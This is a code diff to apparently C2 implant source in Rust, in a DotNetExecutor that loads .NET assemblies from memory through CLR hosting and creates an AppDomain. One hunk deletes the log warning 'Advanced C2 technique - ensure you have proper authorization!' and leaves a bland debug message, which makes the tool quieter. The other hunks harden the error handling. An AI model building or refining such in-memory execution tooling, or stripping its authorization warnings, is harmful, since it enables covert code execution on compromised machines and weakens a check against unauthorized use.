@@ -598,8 +598,7 @@ impl DotNetExecutor {
         arguments: Vec<String>,
         app_domain_name: Option<&str>,
     ) -> CommandResult {
-        log::info!("🚨 .NET ASSEMBLY EXECUTION: Loading assembly from memory");
-        log::warn!("⚠️  Advanced C2 technique - ensure you have proper authorization!");
+        log::debug!("assembly load (memory)");
         
         if assembly_bytes.is_empty() {
             return CommandResult {
@@ -762,7 +761,17 @@ impl DotNetExecutor {
             }
 
             let mut runtime_info: *mut ICLRRuntimeInfo = ptr::null_mut();
-            let version = WideCString::from_str("v4.0.30319").unwrap();
+            let version = match WideCString::from_str("v4.0.30319") {
+                Ok(v) => v,
+                Err(e) => {
+                    return CommandResult {
+                        stdout: String::new(),
+                        stderr: format!("WideCString version: {e}"),
+                        path: None,
+                        req_id: None,
+                    };
+                }
+            };
             let hr = (*meta_host).GetRuntime(
                 version.as_ptr(),
                 &ICLRRuntimeInfo::uuidof(),
@@ -809,7 +818,20 @@ impl DotNetExecutor {
             }
 
             let mut app_domain_unk: *mut IUnknown = ptr::null_mut();
-            let domain_name_w = WideCString::from_str(domain_name).unwrap();
+            let domain_name_w = match WideCString::from_str(domain_name) {
+                Ok(v) => v,
+                Err(e) => {
+                    (*runtime_host).Release();
+                    (*runtime_info).Release();
+                    (*meta_host).Release();
+                    return CommandResult {
+                        stdout: String::new(),
+                        stderr: format!("WideCString domain_name: {e}"),
+                        path: None,
+                        req_id: None,
+                    };
+                }
+            };
             let hr = (*runtime_host).CreateDomain(
                 domain_name_w.as_ptr(),
                 ptr::null_mut(),
